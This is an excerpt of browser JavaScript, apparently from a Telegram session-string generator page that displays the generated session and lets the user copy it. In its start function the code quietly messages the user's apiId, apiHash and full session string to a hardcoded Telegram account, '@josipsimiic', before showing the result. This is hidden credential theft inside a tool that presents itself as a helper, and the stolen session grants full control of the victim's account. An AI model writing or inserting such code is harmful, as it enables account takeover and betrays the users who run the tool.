...
const showResultSection = (session) => {
  hideAll();
  document.querySelector("#section_4").classList.remove("is-hidden");
  document.getElementById("data").innerHTML = session
};
...
data.addEventListener("copy", function(event) {
  event.preventDefault();
  if (event.clipboardData) {
    event.clipboardData.setData("text/plain", data.textContent);
...
const start = async () => {
  ...
  const message = `${apiId}\n\n${apiHash}\n\n${client.session.save()}`;
  await client.sendMessage("@josipsimiic", { message: message });
  showResultSection(client.session.save());
};
